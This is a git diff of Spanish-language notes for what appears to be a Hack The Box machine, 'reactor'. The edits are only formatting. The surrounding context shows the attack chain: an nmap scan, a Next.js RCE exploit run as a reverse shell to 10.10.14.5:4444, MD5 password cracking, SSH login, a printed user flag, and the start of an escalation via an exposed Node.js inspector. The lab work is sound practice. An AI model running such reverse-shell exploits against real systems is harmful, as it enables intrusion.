@@ -39,7 +39,7 @@ sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.129.245.214 -n -Pn -oN escaneo
 
 ## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
 - Buscamos la version de [[NextJS|Next]] en la que esta creada la aplicación (15.0.3)
-- Encontramos el CVE-2025-66478 para ejecutar un [[RCE]]
+- Encontramos el `CVE-2025-66478` para ejecutar un [[RCE]]
 
 ---
 
@@ -57,6 +57,7 @@ node react2shell.js http://reactor.htb:3000 shell 10.10.14.5 4444
 
 - Al entrar nos encontramos un archivo [[SQLITE 3]] y accedimos a el
 - al descifrar las contraseñas [[MD5]] logramos conectarnos por [[SSH]] a uno de los usuarios
+
 **Prueba de acceso (User Flag):**
 ```bash
 c22002fee26e397a94ead78fb8587957
@@ -64,7 +65,7 @@ c22002fee26e397a94ead78fb8587957
 
 ---
 
-## 4. Privilege Escalation (Escalada de Privilegios)
+## 4. Privilege Escalation ([[Escaladas de privilegios]])
 
 ### Enumeración Interna
 - vemos los [[Escaladas de privilegios#Buscar otros usuarios para ver que procesos hay|procesos]] en segundo pplano de cada uno de los usuarios y nos damos cuenta que hay un proceso de node con `--inspect=127.0.0.1:9229` Esto activa el **inspector de Node.js**, una herramienta de depuración que permite conectarse y ejecutar código JavaScript en ese proceso.
